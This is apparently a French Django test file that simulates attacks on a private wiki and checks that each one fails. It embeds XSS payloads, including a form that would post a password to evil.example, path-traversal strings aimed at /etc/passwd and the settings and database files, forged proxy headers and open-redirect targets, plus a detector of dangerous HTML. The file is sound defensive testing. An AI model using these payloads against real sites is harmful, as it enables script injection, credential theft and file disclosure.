"""Tests de sécurité : chaque test simule une attaque et vérifie qu'elle échoue.

Lancer : uv run python manage.py test core
"""

import json
import os
import tempfile
from html.parser import HTMLParser
from pathlib import Path

from django.conf import settings
from django.contrib.auth import get_user_model
from django.contrib.sessions.models import Session
from django.core.files.uploadedfile import SimpleUploadedFile
from django.core.management import call_command
from django.test import Client, TestCase, override_settings

User = get_user_model()
PASSWORD = "Tr3s-l0ng-m0t-de-passe!"

# Réglages obtenus en production sous un vrai nom de domaine (DJANGO_ALLOWED_HOSTS).
PRODUCTION_HTTPS = {
    "ALLOWED_HOSTS": ["wiki.exemple.fr", "testserver"],
    "SECURE_SSL_REDIRECT": True,
    "SESSION_COOKIE_SECURE": True,
    "CSRF_COOKIE_SECURE": True,
    "SECURE_HSTS_SECONDS": 60 * 60 * 24 * 365,
    "SECURE_HSTS_INCLUDE_SUBDOMAINS": True,
}

QUIZ = {
    "titre": "Set piégé",
    "questions": [
        {"id": "q1", "type": "QCM", "question": "<img src=x onerror=alert(1)> 2+2 ?",
         "choix": ["<script>alert(1)</script>", "4"], "reponses": [1],
         "explication": "[clic](javascript:alert(1))"},
    ],
}

XSS_NOTE = """
<script>alert("script")</script>
<img src=x onerror="alert('img')">
<svg onload="alert('svg')"></svg>
<iframe src="https://evil.example/"></iframe>
<a href="javascript:alert('lien')">lien html</a>
[lien markdown](javascript:alert('md'))
[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
<form action="https://evil.example/"><input name="password"></form>
<style>body { display: none }</style>
<div onclick="alert('div')" style="position:fixed">x</div>
<object data="evil.swf"></object><embed src="evil.swf">
<meta http-equiv="refresh" content="0;url=https://evil.example/">
> [!note" onmouseover="alert(1)] Titre
[[Page" onmouseover="alert(1)]]
"""


class DangerFinder(HTMLParser):
    """Analyse le HTML comme un navigateur et relève tout ce qui pourrait exécuter du code."""

    FORBIDDEN_TAGS = {"script", "style", "iframe", "object", "embed", "form", "meta", "link", "base", "svg", "math"}

    def __init__(self):
        super().__init__()
        self.found = []

    def handle_starttag(self, tag, attrs):
        # iframe : seulement les PDF du wiki, ou vide (src externe retiré par le nettoyage).
        src = dict(attrs).get("src") or ""
        if tag in self.FORBIDDEN_TAGS and not (tag == "iframe" and (not src or src.startswith("/fichiers/"))):
            self.found.append(f"<{tag}>")
        for name, value in attrs:
            value = (value or "").strip().lower().replace("\t", "").replace("\n", "")
            if name.startswith("on"):
                self.found.append(f"<{tag} {name}=...>")
            elif name in {"href", "src", "action", "formaction", "xlink:href"} and value.startswith(
                    ("javascript:", "data:", "vbscript:", "//")) or (name in {"src"} and "://" in value):
                self.found.append(f"<{tag} {name}={value}>")
            elif name == "style" and value and not value.startswith("text-align"):
                self.found.append(f"<{tag} style={value}>")


def dangers(html):
    finder = DangerFinder()
    finder.feed(html)
    return finder.found


class SecurityTestCase(TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name) / "vault"
        self.root.mkdir()
        (self.root / "Accueil.md").write_text("Note secrète : TITRE-CONFIDENTIEL", encoding="utf-8")
        (self.root / "XSS.md").write_text(XSS_NOTE, encoding="utf-8")
        (self.root / "piege.html").write_text("<script>alert(document.cookie)</script>", encoding="utf-8")
        (self.root / "piege.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', encoding="utf-8")
        (self.root / "image.png").write_bytes(b"\x89PNG\r\n\x1a\n")
        (self.root / "cours.pdf").write_bytes(b"%PDF-1.4\n%%EOF\n")
        (self.root / "qcm").mkdir()
        (self.root / "qcm" / "piege.json").write_text(json.dumps(QUIZ), encoding="utf-8")
        (Path(tmp.name) / "secret.txt").write_text("HORS-DU-COFFRE", encoding="utf-8")
        override = override_settings(WIKI_DIR=self.root, WIKI_HOME="Accueil", SECURE_SSL_REDIRECT=False)
        override.enable()
        self.addCleanup(override.disable)

        self.admin = User.objects.create_user("admin", password=PASSWORD, is_staff=True)
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.root_user = User.objects.create_superuser("root", password=PASSWORD)

    def as_user(self, user):
        client = Client()
        client.force_login(user)
        return client


class AccessControlTests(SecurityTestCase):
    """Site privé : sans compte, rien n'est accessible."""

    PRIVATE_URLS = [
        "/", "/wiki/Accueil", "/wiki/XSS", "/sommaire/", "/tags/", "/tags/tag", "/recherche/?q=secret",
        "/fichiers/image.png", "/fichiers/qcm/piege.json", "/pdf/cours.pdf", "/pdf/cours.pdf?integre=1",
        "/qcm/", "/qcm/jouer/?set=qcm/piege",
        "/qcm/stats/", "/nouvelle/", "/importer/", "/modifier/Accueil", "/compte/", "/compte/mot-de-passe/",
        "/utilisateurs/", "/api/status/",
    ]
    PRIVATE_POSTS = ["/apercu/X", "/qcm/reponse/", "/qcm/reinitialiser/", "/modifier/Accueil", "/importer/",
                     f"/utilisateurs/1/"]

    def test_anonymous_gets_nothing(self):
        for url in self.PRIVATE_URLS:
            with self.subTest(url=url):
                response = self.client.get(url)
                self.assertEqual(response.status_code, 302)
                self.assertTrue(response["Location"].startswith("/connexion/"), response["Location"])
        for url in self.PRIVATE_POSTS:
            with self.subTest(url=url):
                response = self.client.post(url, {"content": "x", "version": "", "action": "promote"})
                self.assertEqual(response.status_code, 302)
        self.assertFalse((self.root / "X.md").exists())
        self.assertIn("CONFIDENTIEL", (self.root / "Accueil.md").read_text(encoding="utf-8"))

    def test_login_page_leaks_no_content(self):
        page = self.client.get("/connexion/").content.decode()
        for secret in ("Accueil", "XSS", "piege", "TITRE-CONFIDENTIEL", "note(s)", "tree"):
            self.assertNotIn(secret, page)

    def test_admin_site_requires_staff(self):
        self.assertIn("/admin/login/", self.client.get("/admin/")["Location"])
        self.assertIn("/admin/login/", self.as_user(self.user).get("/admin/")["Location"])

    def test_registration_closed(self):
        self.client.post("/inscription/", {"username": "intrus", "password1": PASSWORD, "password2": PASSWORD})
        self.assertFalse(User.objects.filter(username="intrus").exists())


class PrivilegeEscalationTests(SecurityTestCase):
    """Un utilisateur simple ne peut ni modifier le wiki ni gérer les comptes."""

    def test_user_cannot_edit_or_manage(self):
        c = self.as_user(self.user)
        self.assertEqual(c.post("/modifier/Accueil", {"content": "piraté", "version": ""}).status_code, 403)
        self.assertEqual(c.post("/modifier/Nouvelle", {"content": "x", "version": ""}).status_code, 403)
        self.assertEqual(c.get("/nouvelle/").status_code, 403)
        self.assertEqual(c.post("/apercu/X", {"content": "x"}).status_code, 403)
        self.assertEqual(c.get("/importer/").status_code, 403)
        upload = SimpleUploadedFile("Pirate.md", b"pirate")
        self.assertEqual(c.post("/importer/", {"fichiers": [upload]}).status_code, 403)
        self.assertEqual(c.post("/importer/", {"fichiers": [upload], "pour_note": "Accueil"}).status_code, 403)
        self.assertEqual(c.get("/utilisateurs/").status_code, 403)
        self.assertEqual(c.post(f"/utilisateurs/{self.user.pk}/", {"action": "promote"}).status_code, 403)
        self.assertEqual(c.post("/utilisateurs/", {"username": "x", "role": "admin",
                                                   "password1": PASSWORD, "password2": PASSWORD}).status_code, 403)
        self.user.refresh_from_db()
        self.assertFalse(self.user.is_staff)
        self.assertIn("CONFIDENTIEL", (self.root / "Accueil.md").read_text(encoding="utf-8"))
        self.assertFalse((self.root / "Nouvelle.md").exists())
        self.assertFalse((self.root / "Pirate.md").exists())

    def test_profile_form_cannot_set_role(self):
        # Aucune vue ne permet à un utilisateur de modifier ses propres champs is_staff/is_superuser.
        c = self.as_user(self.user)
        c.post("/compte/", {"is_staff": "on", "is_superuser": "on"})
        c.post("/compte/mot-de-passe/", {"is_staff": "on"})
        self.user.refresh_from_db()
        self.assertFalse(self.user.is_staff or self.user.is_superuser)

    def test_admin_cannot_touch_superuser_or_self(self):
        c = self.as_user(self.admin)
        c.post(f"/utilisateurs/{self.root_user.pk}/", {"action": "deactivate"})
        c.post(f"/utilisateurs/{self.root_user.pk}/", {"action": "demote"})
        self.root_user.refresh_from_db()
        self.assertTrue(self.root_user.is_active and self.root_user.is_staff)

    def test_quiz_progress_is_private(self):
        from wiki.models import QuizProgress
        QuizProgress.objects.create(player="admin", set_id="qcm/piege", question_id="q1", box=4)
        c = self.as_user(self.user)
        c.post("/qcm/reinitialiser/", {"set": "qcm/piege"})
        self.assertTrue(QuizProgress.objects.filter(player="admin").exists())
        # Le champ « player » envoyé par le client est ignoré.
        c.post("/qcm/reponse/", data={"set_id": "qcm/piege", "question_id": "q1", "correct": False, "player": "admin"},
               content_type="application/json")
        self.assertEqual(QuizProgress.objects.get(player="admin").box, 4)


class XSSTests(SecurityTestCase):
    """Aucun script injecté dans une note, un QCM ou un fichier ne s'exécute."""

    def assertSafe(self, html):
        self.assertEqual(dangers(html), [], html)

    def test_detector_works(self):
        # Contrôle du détecteur lui-même : il doit repérer le HTML dangereux brut.
        self.assertGreaterEqual(len(dangers(XSS_NOTE)), 10)

    def test_note_is_sanitized(self):
        response = self.as_user(self.user).get("/wiki/XSS")
        self.assertEqual(response.status_code, 200)
        self.assertSafe(response.context["content"])
        self.assertSafe(response.context["toc"])

    def test_preview_is_sanitized(self):
        response = self.as_user(self.admin).post("/apercu/X", {"content": XSS_NOTE})
        self.assertSafe(response.content.decode())

    def test_quiz_is_sanitized(self):
        response = self.as_user(self.user).get("/qcm/jouer/?set=qcm/piege")
        question = response.context["questions"][0]
        for field in ("enonce", "explication", *question["choix"]):
            self.assertSafe(question.get(field, field))
        # Les données du quiz sont dans un bloc JSON non exécutable.
        self.assertContains(response, 'type="application/json"')

    def test_search_snippet_escaped(self):
        response = self.as_user(self.user).get("/recherche/", {"q": "alert"})
        for _, snippet in response.context["results"]:
            self.assertSafe(snippet)

    def test_uploaded_html_and_svg_cannot_run(self):
        c = self.as_user(self.user)
        for name in ("piege.html", "piege.svg"):
            response = c.get(f"/fichiers/{name}")
            response.close()
            self.assertIn("attachment", response["Content-Disposition"])
            self.assertIn("sandbox", response["Content-Security-Policy"])
            self.assertEqual(response["X-Content-Type-Options"], "nosniff")

    def test_csp_blocks_inline_scripts(self):
        csp = self.as_user(self.user).get("/wiki/Accueil")["Content-Security-Policy"]
        script_src = next(d for d in csp.split(";") if d.strip().startswith("script-src"))
        self.assertNotIn("unsafe-inline", script_src)
        self.assertNotIn("unsafe-eval", script_src)
        for directive in ("object-src 'none'", "base-uri 'none'", "form-action 'self'"):
            self.assertIn(directive, csp)


class PathTraversalTests(SecurityTestCase):
    """Impossible de lire ou d'écrire un fichier hors du coffre."""

    def test_read_outside_vault(self):
        c = self.as_user(self.user)
        for path in ["../secret.txt", "..%2fsecret.txt", "%2e%2e/secret.txt", "qcm/../../secret.txt",
                     "..\\secret.txt", "/etc/passwd", "C:/Windows/win.ini", ".obsidian/app.json",
                     "../config/settings.py", "../../db.sqlite3"]:
            with self.subTest(path=path):
                response = c.get(f"/fichiers/{path}")
                self.assertIn(response.status_code, (301, 302, 400, 404))

    def test_symlink_outside_vault(self):
        link = self.root / "lien.txt"
        try:
            os.symlink(self.root.parent / "secret.txt", link)
        except (OSError, NotImplementedError):
            self.skipTest("liens symboliques non disponibles sur ce système")
        self.assertEqual(self.as_user(self.user).get("/fichiers/lien.txt").status_code, 404)

    def test_write_outside_vault(self):
        c = self.as_user(self.admin)
        for path in ["../pirate", "..%2fpirate", "a/../../pirate", ".obsidian/pirate", "C:/pirate",
                     "a\\..\\..\\pirate", "%2e%2e/pirate"]:
            with self.subTest(path=path):
                c.post(f"/modifier/{path}", {"content": "x", "version": ""})
        written = {p.name for p in self.root.parent.rglob("pirate*")}
        self.assertEqual(written, set())


class UploadTests(SecurityTestCase):
    """L'import de fichiers n'écrit que des notes et des médias, et seulement dans le coffre."""

    def upload(self, files, **extra):
        c = self.as_user(self.admin)
        data = {"fichiers": [SimpleUploadedFile(name.rsplit("/", 1)[-1], body) for name, body in files],
                "chemins": [name for name, _ in files], **extra}
        return c.post("/importer/", data, HTTP_ACCEPT="application/json").json()

    def test_dangerous_files_refused(self):
        results = self.upload([
            ("page.html", b"<script>alert(1)</script>"), ("x.js", b"alert(1)"), ("qcm/piege.json", b"{}"),
            ("x.py", b"import os"), ("x.svgz", b"x"), ("sans-extension", b"x"),
        ])["results"]
        self.assertEqual([r["ok"] for r in results], [False] * 6)
        self.assertFalse((self.root / "page.html").exists())
        self.assertEqual(json.loads((self.root / "qcm" / "piege.json").read_text(encoding="utf-8")), QUIZ)

    def test_write_outside_vault(self):
        paths = ["../pirate.md", "a/../../pirate.md", "C:/pirate.md", "..\\pirate.md",
                 ".obsidian/pirate.md", ".trash/pirate.md", "a/.git/pirate.md"]
        results = self.upload([(p, b"x") for p in paths])["results"]
        self.assertFalse(any(r["ok"] for r in results), results)
        self.assertEqual({p.name for p in self.root.parent.rglob("pirate*")}, set())
        for folder in ["../dehors", ".obsidian", "a/../..", "a:b"]:
            with self.subTest(folder=folder):
                response = self.as_user(self.admin).post(
                    "/importer/", {"fichiers": [SimpleUploadedFile("n.md", b"x")], "dossier": folder}, HTTP_ACCEPT="application/json")
                self.assertEqual(response.status_code, 400)
        self.assertEqual({p.name for p in self.root.parent.rglob("n.md")}, set())

    def test_symlinked_folder_outside_vault(self):
        try:
            os.symlink(self.root.parent, self.root / "lien")
        except (OSError, NotImplementedError):
            self.skipTest("liens symboliques non disponibles sur ce système")
        results = self.upload([("lien/pirate.md", b"x")])["results"]
        self.assertFalse(results[0]["ok"])
        self.assertFalse((self.root.parent / "pirate.md").exists())

    def test_uploaded_svg_not_executed(self):
        svg = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>'
        self.assertTrue(self.upload([("dessin.svg", svg)])["results"][0]["ok"])
        response = self.as_user(self.user).get("/fichiers/dessin.svg")
        self.assertIn("sandbox", response["Content-Security-Policy"])
        self.assertIn("attachment", response["Content-Disposition"])


class CSRFTests(SecurityTestCase):
    """Un site tiers ne peut pas faire agir un utilisateur connecté à son insu."""

    def test_post_without_token_rejected(self):
        c = Client(enforce_csrf_checks=True)
        c.force_login(self.admin)
        for url, data in [("/modifier/Accueil", {"content": "piraté", "version": ""}),
                          (f"/utilisateurs/{self.user.pk}/", {"action": "promote"}),
                          ("/qcm/reinitialiser/", {"set": "qcm/piege"}),
                          ("/importer/", {"fichiers": [SimpleUploadedFile("Csrf.md", b"x")]}),
                          ("/deconnexion/", {})]:
            with self.subTest(url=url):
                self.assertEqual(c.post(url, data).status_code, 403)
        self.assertEqual(c.post("/qcm/reponse/", data="{}", content_type="application/json").status_code, 403)
        self.user.refresh_from_db()
        self.assertFalse(self.user.is_staff)

    def test_logout_requires_post(self):
        c = self.as_user(self.user)
        self.assertEqual(c.get("/deconnexion/").status_code, 405)
        self.assertEqual(c.get("/compte/").status_code, 200)


class AuthenticationTests(SecurityTestCase):
    def login(self, client, username, password, **extra):
        return client.post("/connexion/", {"username": username, "password": password, **extra})

    def test_brute_force_locked_out(self):
        for _ in range(settings.AXES_FAILURE_LIMIT):
            self.login(self.client, "alice", "mauvais")
        response = self.login(self.client, "alice", PASSWORD)
        self.assertEqual(response.status_code, 429)
        self.assertNotIn("_auth_user_id", self.client.session)
        call_command("axes_reset", verbosity=0)
        self.assertEqual(self.login(self.client, "alice", PASSWORD).status_code, 302)

    def fail_from(self, client, **headers):
        return client.post("/connexion/", {"username": "alice", "password": "mauvais"}, **headers)

    @override_settings(CLOUDFLARE=True, BEHIND_PROXY=True)
    def test_brute_force_behind_cloudflare(self):
        # Cloudflare → Caddy → Django : chaque visiteur a son IP (CF-Connecting-IP).
        # Changer X-Forwarded-For à chaque essai n'échappe pas au blocage...
        for i in range(settings.AXES_FAILURE_LIMIT):
            self.fail_from(self.client, REMOTE_ADDR="127.0.0.1", HTTP_CF_CONNECTING_IP="203.0.113.7",
                           HTTP_X_FORWARDED_FOR=f"10.0.0.{i}, 172.70.1.1")
        locked = self.client.post("/connexion/", {"username": "alice", "password": PASSWORD}, REMOTE_ADDR="127.0.0.1",
                                  HTTP_CF_CONNECTING_IP="203.0.113.7", HTTP_X_FORWARDED_FOR="10.0.0.99, 172.70.1.1")
        self.assertEqual(locked.status_code, 429)
        # ... et l'attaquant ne bloque pas le vrai propriétaire du compte.
        owner = Client().post("/connexion/", {"username": "alice", "password": PASSWORD}, REMOTE_ADDR="127.0.0.1",
                              HTTP_CF_CONNECTING_IP="198.51.100.9", HTTP_X_FORWARDED_FOR="172.70.1.1")
        self.assertEqual(owner.status_code, 302)

    @override_settings(BEHIND_PROXY=True)
    def test_brute_force_forged_forwarded_for(self):
        # Derrière Caddy : seule compte la dernière adresse, ajoutée par Caddy.
        for i in range(settings.AXES_FAILURE_LIMIT):
            self.fail_from(self.client, REMOTE_ADDR="127.0.0.1", HTTP_X_FORWARDED_FOR=f"6.6.6.{i}, 192.0.2.10",
                           HTTP_CF_CONNECTING_IP=f"7.7.7.{i}")
        response = self.client.post("/connexion/", {"username": "alice", "password": PASSWORD},
                                    REMOTE_ADDR="127.0.0.1", HTTP_X_FORWARDED_FOR="6.6.6.99, 192.0.2.10")
        self.assertEqual(response.status_code, 429)
        other = Client().post("/connexion/", {"username": "alice", "password": PASSWORD},
                              REMOTE_ADDR="127.0.0.1", HTTP_X_FORWARDED_FOR="192.0.2.20")
        self.assertEqual(other.status_code, 302)

    def test_brute_force_headers_ignored_without_proxy(self):
        for i in range(settings.AXES_FAILURE_LIMIT):
            self.fail_from(self.client, HTTP_X_FORWARDED_FOR=f"6.6.6.{i}", HTTP_CF_CONNECTING_IP=f"7.7.7.{i}")
        response = self.client.post("/connexion/", {"username": "alice", "password": PASSWORD},
                                    HTTP_X_FORWARDED_FOR="6.6.6.99", HTTP_CF_CONNECTING_IP="7.7.7.99")
        self.assertEqual(response.status_code, 429)

    def test_no_user_enumeration(self):
        unknown = self.login(Client(), "personne", "mauvais").content.decode()
        wrong = self.login(Client(), "alice", "mauvais").content.decode()
        marker = "Saisissez un nom d"
        self.assertIn(marker, unknown)
        self.assertEqual(unknown.count(marker), wrong.count(marker))

    def test_session_fixation(self):
        self.client.get("/connexion/")
        self.client.cookies["sessionid"] = "cle-imposee-par-attaquant"
        self.login(self.client, "alice", PASSWORD)
        self.assertNotEqual(self.client.cookies["sessionid"].value, "cle-imposee-par-attaquant")

    def test_logout_destroys_session(self):
        self.login(self.client, "alice", PASSWORD)
        key = self.client.session.session_key
        self.client.post("/deconnexion/")
        self.assertFalse(Session.objects.filter(session_key=key).exists())

    def test_open_redirect_blocked(self):
        for target in ["https://evil.example/", "//evil.example/", "/\\evil.example/", "https:evil.example"]:
            with self.subTest(target=target):
                response = self.login(Client(), "alice", PASSWORD, next=target)
                self.assertEqual(response["Location"], "/")

    def test_deactivated_account_cannot_login(self):
        self.user.is_active = False
        self.user.save()
        response = self.login(self.client, "alice", PASSWORD)
        self.assertEqual(response.status_code, 200)
        self.assertNotIn("_auth_user_id", self.client.session)

    def test_password_change_logs_out_other_sessions(self):
        other = self.as_user(self.user)
        c = self.as_user(self.user)
        c.post("/compte/mot-de-passe/", {"old_password": PASSWORD, "new_password1": "Un-autre-m0t-de-passe!",
                                         "new_password2": "Un-autre-m0t-de-passe!"})
        self.assertEqual(c.get("/compte/").status_code, 200)
        self.assertEqual(other.get("/compte/").status_code, 302)

    def test_weak_passwords_rejected(self):
        c = self.as_user(self.admin)
        # Trop court, uniquement des chiffres, trop courant, trop proche du nom d'utilisateur.
        for weak in ["Court-1!", "123456789012", "password1234", "bob-bob-bob-bob"]:
            with self.subTest(password=weak):
                c.post("/utilisateurs/", {"username": "bob-bob-bob-bob", "role": "utilisateur",
                                          "password1": weak, "password2": weak})
                self.assertFalse(User.objects.filter(username="bob-bob-bob-bob").exists())

    def test_passwords_hashed(self):
        stored = User.objects.get(username="alice").password
        self.assertNotIn(PASSWORD, stored)
        self.assertTrue(stored.startswith(("pbkdf2_sha256$", "argon2", "scrypt$")))


class ConfigurationTests(SecurityTestCase):
    def test_production_defaults(self):
        self.assertFalse(settings.DEBUG)
        self.assertNotIn("django-insecure", settings.SECRET_KEY)
        self.assertGreaterEqual(len(settings.SECRET_KEY), 50)
        self.assertNotIn("*", settings.ALLOWED_HOSTS)

    def test_pdf_reader_only_framed_by_the_site(self):
        c = self.as_user(self.user)
        for url in ["/pdf/cours.pdf", "/pdf/cours.pdf?integre=1"]:
            with self.subTest(url=url):
                response = c.get(url)
                self.assertEqual(response["X-Frame-Options"], "SAMEORIGIN")
                self.assertIn("frame-ancestors 'self'", response["Content-Security-Policy"])
        # Le lecteur n'ouvre que des PDF du coffre.
        for path in ["piege.html", "piege.svg", "qcm/piege.json", "../secret.txt", "..%2fsecret.txt", "absent.pdf"]:
            with self.subTest(path=path):
                self.assertEqual(c.get(f"/pdf/{path}").status_code, 404)

    def test_private_pages_never_in_shared_cache(self):
        # Derrière Cloudflare, une réponse sans « private » peut être gardée selon
        # son extension (.png, .pdf…) et resservie à quelqu'un sans compte.
        c = self.as_user(self.user)
        for client, url in [(c, "/wiki/Accueil"), (c, "/fichiers/image.png"), (c, "/fichiers/cours.pdf"),
                            (c, "/pdf/cours.pdf"), (c, "/qcm/hors-ligne/catalogue/"), (Client(), "/fichiers/image.png"),
                            (Client(), "/connexion/")]:
            with self.subTest(url=url, connecte=client is c):
                response = client.get(url)
                self.assertIn("private", response["Cache-Control"])
                self.assertNotIn("public", response["Cache-Control"])
                response.close()

    def test_security_headers(self):
        response = self.as_user(self.user).get("/wiki/Accueil")
        self.assertEqual(response["X-Frame-Options"], "DENY")
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")
        self.assertEqual(response["Referrer-Policy"], "same-origin")
        self.assertEqual(response["Cross-Origin-Opener-Policy"], "same-origin")
        self.assertIn("Content-Security-Policy", response)

    def test_session_cookie_flags(self):
        response = self.client.post("/connexion/", {"username": "alice", "password": PASSWORD})
        cookie = response.cookies["sessionid"]
        self.assertTrue(cookie["httponly"])
        self.assertEqual(cookie["samesite"], "Lax")
        self.assertEqual(bool(cookie["secure"]), settings.SESSION_COOKIE_SECURE)

    def settings_for(self, **env):
        """Valeurs HTTPS calculées par config/settings.py pour un environnement donné."""
        import subprocess
        import sys
        code = ("from config import settings as s; "
                "print(s.SECURE_SSL_REDIRECT, s.SESSION_COOKIE_SECURE, s.CSRF_COOKIE_SECURE, s.SECURE_HSTS_SECONDS > 0)")
        clean = {k: v for k, v in os.environ.items() if not k.startswith("DJANGO_")}
        out = subprocess.run([sys.executable, "-c", code], env={**clean, **env}, cwd=settings.BASE_DIR,
                             capture_output=True, text=True, check=True).stdout.split()
        return set(out)

    def test_https_forced_for_real_domain(self):
        # Sous un vrai nom de domaine, HTTPS est forcé sans rien configurer.
        self.assertEqual(self.settings_for(DJANGO_ALLOWED_HOSTS="wiki.exemple.fr"), {"True"})
        self.assertEqual(self.settings_for(DJANGO_ALLOWED_HOSTS="localhost,wiki.exemple.fr"), {"True"})
        # En local (runserver ne parle pas HTTPS) ou en debug : non forcé.
        self.assertEqual(self.settings_for(), {"False"})
        self.assertEqual(self.settings_for(DJANGO_DEBUG="1", DJANGO_ALLOWED_HOSTS="wiki.exemple.fr"), {"False"})
        # Choix explicite prioritaire.
        self.assertEqual(self.settings_for(DJANGO_HTTPS="1"), {"True"})

    @override_settings(**PRODUCTION_HTTPS)
    def test_https_enforced(self):
        response = self.client.get("/connexion/")
        self.assertEqual(response.status_code, 301)
        self.assertTrue(response["Location"].startswith("https://"))
        response = self.client.get("/connexion/", secure=True)
        self.assertIn("max-age=31536000", response["Strict-Transport-Security"])

    def test_deploy_check(self):
        from django.core.checks import run_checks
        with override_settings(**PRODUCTION_HTTPS):
            issues = [i for i in run_checks(include_deployment_checks=True) if i.level >= 30
                      # W021 : préchargement HSTS, à décider lors de l'inscription du domaine sur hstspreload.org.
                      and i.id != "security.W021"
                      # E001 : le lanceur de tests remplace lui-même l'envoi d'e-mails par une boîte en mémoire.
                      and i.id != "mail.E001"]
        self.assertEqual([f"{i.id}: {i.msg}" for i in issues], [])
